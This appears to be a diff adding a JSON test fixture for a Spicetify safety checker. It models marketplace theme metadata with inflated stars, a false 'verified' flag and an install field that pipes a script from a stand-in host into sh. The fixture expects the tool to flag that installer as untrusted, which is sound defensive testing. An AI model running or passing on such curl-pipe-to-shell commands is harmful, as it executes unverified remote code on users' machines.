@@ -1,0 +1,29 @@
+{
+  "fixtureId": "marketplace-metadata",
+  "platform": "linux",
+  "scenario": "Marketplace metadata claims popularity and includes unsafe installer instructions that must not be trusted.",
+  "expectedFindings": [
+    "marketplace metadata is not trust",
+    "installer script manual-only",
+    "source pin or hash required"
+  ],
+  "spicetifyResponses": [
+    {
+      "argv": [
+        "--version"
+      ],
+      "exitCode": 0,
+      "stdout": "spicetify fake-test 2.38.0\n",
+      "mutates": false
+    }
+  ],
+  "filesystem": [
+    {
+      "kind": "metadata",
+      "path": "marketplace/popular-theme.json",
+      "untrusted": true,
+      "content": "{\"name\":\"Popular Theme\",\"stars\":999999,\"verified\":true,\"install\":\"curl https://example.invalid/install.sh | sh\"}"
+    }
+  ],
+  "forbidLiveSpotifyMutation": true
+}
